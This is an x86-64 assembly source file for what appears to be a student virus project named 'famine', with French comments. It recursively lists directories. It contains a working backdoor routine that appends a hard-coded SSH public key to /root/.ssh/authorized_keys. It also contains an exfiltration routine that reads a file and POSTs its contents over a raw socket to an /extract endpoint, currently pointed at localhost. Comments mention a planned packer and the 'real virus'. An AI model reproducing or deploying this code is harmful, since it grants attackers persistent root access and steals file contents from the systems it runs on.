%include "famine.inc"

bits 64
default rel

section .text
global _start

_start:
    mov rbp, rsp

    ;socket
    sub rsp, sock_size
    call _initSocket
    lea rsi, SOCK(sock.sockfd)
    mov [rsi], rax
    mov rsi, testSend
    call _open_file

    mov rdx, 0
    mov rdi, dir1                                       ; dir to open for arg initDir
    call _initDir

    ; debug
    mov rsi, tiret
    writeWork

    mov rdx, 0
    mov rdi, dir2                                       ; dir to open for arg initDir
    lea rsi, SOCK(sock.sockfd)
    call _initDir

    call _backdoor

    mov rdi, SOCK(sock.sockfd)
    call _closeSock

    jmp _exit

; take directory to open in rdi-> pwd
; rdx == 0 ? rien : recreate a path: rdi/rsi
; rsi -> sockfd
_initDir:
    ; placing famine on the stack
    push rbp
    mov rbp, rsp
    sub rsp, famine_size
    lea rsi, FAM(famine.pwd)
    call _strcpy                                            ; strcpy(famine.pwd(rsi), pwd(rdi))
    cmp rdx, 0
    je _readDir
    call _strlen                                            ; strlen(famine.pwd(rsi))
    add rsi, rax
    cmp BYTE [rsi - 1], '/'
    je _join
    mov BYTE [rsi], '/'
    add rsi, 1

    _join:
    mov rdi, rdx
    call _strcpy

    ; debug
    ; mov rsi, rsp
    ; writeWork
    ; writeBack

    mov rdi, rsp

_readDir:
    mov rax, SYS_OPEN 
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall
    cmp rax, 0
    jl _returnClose

    lea rdi, FAM(famine.fd)                             ; en registre le fd dans la struct
    mov [rdi], rax

    _getDents:
        lea r10, FAM(famine.fd) 
        lea r9, FAM(famine.total_read)                      ; init total_read
        mov DWORD[r9], 0
        mov rax, SYS_GETDENTS                   			; getdents64(int fd, void *buf, size_t size_buf)
        mov rdi, [r10]
        lea rsi, FAM(famine.dirents)
        mov rdx, PAGE_SIZE
        syscall
        cmp rax, 0
        jle _returnClose

    lea r10, FAM(famine.dirents_struct_ptr) 			; r10 -> (struct famine.diretents_struct_ptr)
    mov [r10], rsi          	                		; famine.dirents_struct_ptr -> famine.dirents
    lea r11, FAM(famine.total_to_read)      			; r11 -> (struct famine.total_to_read)
    mov DWORD [r11], eax                        		; famine.total_to_read = getdents total length

    _listFile:
        lea r8, FAM(famine.total_read)      			; r8 -> total lu de getdents
        lea r9, FAM(famine.total_to_read)       		; r9 -> total a lire de getdents
        mov r10, FAM(famine.dirents_struct_ptr) 		; r10 -> actual dirent struct
        lea r11, FAM(famine.dirents_struct_ptr) 		; r11 -> ptr de la struct actuelle
        movzx r12, WORD [r10 + D_RECLEN_OFF] 			; r12 = length de la stuct dirents actuelle
        add [r8], r12d                        			; update du total lu dans r8
        add [r11], r12                          		; famine.diretns_struct_ptr -> sur la prochaine struct
        cmp BYTE [r10 + D_TYPE], D_FOLDER
        je _recursif
        cmp BYTE [r10 + D_TYPE], D_REG_FILE 			; verifie le type du fichier
        jne _checkRead

        ; debug
        mov rsi, rsp
        writeWork
        writeSlash

        lea rsi, [r10 + D_NAME]                 		; charge le nom du fichier dans rsi

        writeWork                               		; a modifier avec ta fonction
        writeBack
        jmp _checkRead

            _recursif:
                lea rdi, FAM(famine.pwd)
                lea rdx, [r10 + D_NAME]                 ; rdi -> folder name
                cmp BYTE [rdx], 0x2e
                jne _callInit
                cmp BYTE [rdx + 1], 0
                je _checkRead
                cmp BYTE [rdx + 1], 0x2e
                jne _callInit
                cmp BYTE [rdx + 2], 0
                je _checkRead

                _callInit:
                    call _initDir

            _checkRead:
                mov r8, FAM(famine.total_read)
                mov r12, FAM(famine.total_to_read)
                cmp r8d, r12d                 			; if (total lu >= total getdents)
                jge _getDents
                jmp _listFile

    _returnClose:
        mov rax, SYS_CLOSE
        mov rdi, FAM(famine.fd)
        syscall

_returnLeave:
    leave
    ret

; --- privesc + backdoor
_backdoor:
    ; open "/root/.ssh/authorized.key"
    ; r9 == fd
    push rbp
    mov rbp, rsp
    sub rsp, 0x1000                     ;buffer read
    mov rax, SYS_OPEN
    mov rdi, sshFile
    mov rsi, O_RDWR | O_CREAT
    mov rdx, 600
    syscall
    test rax, rax
    js _returnLeave
    mov r9, rax

    _readSsh:
        ; *r9 == fd
        ; r10 == size read
        ; rsi -> buffer
        mov rax, SYS_READ
        mov rdi, r9
        mov rsi, rbp
        sub rsi, 0x1000
        mov rdx, 0x1000
        syscall
        cmp rax, 0
        je _notFound
        jl _closeSsh
        mov r10, rax

    _checkBackdoor:
        ; rcx == nombre d'octet lue
        ; r11 -> buffer
        mov rcx, r10
        mov r11, rsi

        ; for every new line
        _findNewline:
            cmp byte [r11], 0xa
            je _cmpLine
            inc r11
            loop _findNewline
            mov rax, SYS_WRITE
            mov rsi, back
            mov rdx, 1
            syscall
            jmp _notFound

            ; cmp the line with pub ssh key
            _cmpLine:
                mov byte [r11], 0
                mov rdi, r11
                sub rdi, sshPubLen - 1
                mov rsi, sshPub
                push rcx
                call _strcmp
                pop rcx
                test rax, rax            
                je _closeSsh
                inc r11
                loop _findNewline

        ; if not found write it
        _notFound:
            mov rdi, r9
            mov rax, SYS_WRITE
            mov rsi, sshPub
            mov rdx, sshPubLen - 1
            syscall
            mov rax, SYS_WRITE
            mov rsi, back
            mov rdx, 1
            syscall

    _closeSsh:
        mov rax, SYS_CLOSE
        mov rdi, r9
        syscall
        jmp _returnLeave;

; ---- envoie de requete http
; debut du prog
;   creer la socket
;   la connecter
; pour chaque fichier dans le directory, sauvegarder son contenue (open + nmap)
;   l'envoyer avec sendto
;   faire une verif pour si jamais j'ai pas recu a faire la socket ou quoi que ce soit, je give up l'envoie
_initSocket:

    _creatSocket:
        mov rax, SYS_SOCKET
        mov rdi, AF_INET
        mov rsi, SOCK_STREAM
        xor rdx, rdx
        syscall
        test rax, rax
        js _returnLeave
        mov rdi, rax

    _connectSocket:
        mov rax, SYS_CONNECT
        lea rsi, sockaddr
        mov rdx, 16
        syscall
        test rax, rax
        js _closeSock
        mov rax, rdi
        ret

; (rdi: socket)
_closeSock:
    mov rax, SYS_CLOSE
    syscall
    mov rax, 0
    ret

    ; ============= A ENLEVER ===================== ;
	_open_file:
		mov	rax, SYS_OPEN
		mov rdi, rsi
		mov rsi, O_RDWR
		xor rdx, rdx 
		syscall
		cmp	rax, 0x0
		jl	_returnLeave
		mov INF(infection.file_fd), rax

	; === get file size ===
	_get_filesz:
		mov rax, SYS_LSEEK
		mov	rdi, INF(infection.file_fd)
		mov	rsi, 0x0
		mov rdx, SEEK_END
		syscall
		cmp rax, 0x0
		jle _close_file

	_map_file:
	; rax	-> map
		mov rsi, rax								; rsi = file_size
		mov rax, SYS_MMAP
		mov	rdi, 0x0
		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
		mov r10, MAP_SHARED
		mov r8, INF(infection.file_fd)
		mov r9, 0x0
		syscall
		cmp	rax, 0x0								; rax -> map (used later)
		jl _returnLeave
        mov r13, 0x3
        call _extractData
        ret

    _close_file:
        mov	rax, 0x3
        mov	rdi, INF(infection.file_fd)
        syscall
        jmp _returnLeave
        jmp _checkRead
    ; ============================================;

; doit prendre le sockfd en argument (r13 == sockfd)
_extractData:
    _mmapBuffer:
    ; rax -> mmap buffer
    ; r15 == la size du mmap buffer
        mov r12, rax                             ; r12 -> maped file_date
        mov rax, SYS_MMAP
        xor rdi, rdi
        ; sauvergader rsi pour l'execution de base sur le vrai virus ? 
        push rsi
        add rsi, headerStartLen
        add rsi, headerEndLen
        add rsi, 10                             ; pour le content length
        mov r15, rsi
        mov rdx, PROT_READ | PROT_WRITE
        mov r10, MAP_PRIVATE | MAP_ANONYMOUS
        xor r8, r8
        xor r9, r9
        syscall

    _copyData:
        ; r14 -> header buffer
        ; rsi -> end header buffer
        ; *r15 == la taille du mmap buffer
        ; j'ai perdu la length du fichier maper faut que le rechope
        mov r14, rax
        mov rsi, rax
        mov rdi, headerStart
        call _strcpy
        ; attention taille dans rax
        pop rax
        add rsi, headerStartLen - 1
        call _itoa
        mov rdi, headerEnd
        call _strcpy
        add rsi, headerEndLen - 1
        mov rdi, r12
        call _strcpy

    _sendTo:
        mov rax, SYS_SENDTO
        mov rdi, r13
        mov rsi, r14
        mov rdx, r15
        xor r10, r10
        syscall
        ret

; A FAIRE DEMAIN
; - rsi doit avoir la size lu a la fin de la fonction ?
; - ne pas send si le fd est =0 ou -1
; - mettre extract data dans la boucle de fichier
; - patch la boucle de fichier pour faire en sorte d'avoir le path complet du fichier (ca a pas l'air d'etre le cas)

; ---packer
; jsp encore

; strcpy(dst:rsi src: rdi)
_strcpy:
	xor rcx, rcx
	strcpy_loop:
		cmp byte [rdi + rcx], 0
		je	strcpy_loop_end
		mov al, byte [rdi + rcx]
		mov [rsi + rcx], al
		add rcx, 1
		jmp strcpy_loop

	strcpy_loop_end:
		mov byte [rsi + rcx], 0
		ret

; strlen(str:rsi)
_strlen:
	xor rcx, rcx
	
	ft_strlen_loop:
		cmp	byte [rsi + rcx], 0
		je	ft_strlen_end
		inc rcx
		jmp	ft_strlen_loop

	ft_strlen_end:
		mov rax, rcx
		ret

; strcmp(rdi, rsi)
_strcmp:
	xor rcx, rcx
	xor rax, rax
	strcmp_loop:
		mov al, byte [rdi + rcx]
		mov bl, byte [rsi + rcx]
		cmp al, bl
		jl strcmp_loop_end
		je strcmp_loop_end
		jg strcmp_loop_end

		cmp al, 0
		je strcmp_loop_end

		add rcx, 1
		jmp strcmp_loop

	strcmp_loop_end:
		movzx rax, al
		movzx r8, bl
		sub rax, r8
		ret

; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
_itoa:
    mov r9, 10
    call _itoaLoop
    ret

    _itoaLoop:
        cmp rax, 9
        jg _itoaRecursif
        mov [rsi], ax
        add byte [rsi], 48
        inc rsi
        ret

    _itoaRecursif:
        push rax
        xor rdx, rdx
        div r9
        call _itoaLoop 
        pop rax
        push rax
        xor rdx, rdx
        div r9
        mov rax, rdx
        call _itoaLoop 
        pop rax
        ret

_exit:
    mov rax, 60
    xor rdi, rdi
    syscall

dir1        db  "../test", 0
dir2        db  "../test2", 0
back        db  10, 0
slash       db "/", 0
tiret       db 10, "-------", 10, 10, 0
sshFile     db "/root/.ssh/authorized_keys", 0
sshPub      db "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
sshPubLen   equ $-sshPub
sockaddr:
    dw 2            ; AF_INET
    dw 0x401F       ; PORT 8000
    dd 0x100007F    ; 127.0.0.1 (en hexadécimal)
    dq 0            ; padding

headerStart db "POST /extract HTTP/1.1", 13, 10, \
                "Host: 127.0.0.1", 13, 10, \
                "Content-Type: text/plain", 13, 10, \
                "Content-Length: ", 0 
headerStartLen equ $-headerStart
headerEnd db 13, 10, 13, 10, 0  ; Fin de l'entête avant le body
headerEndLen equ $-headerEnd
testSend    db  "../README.md"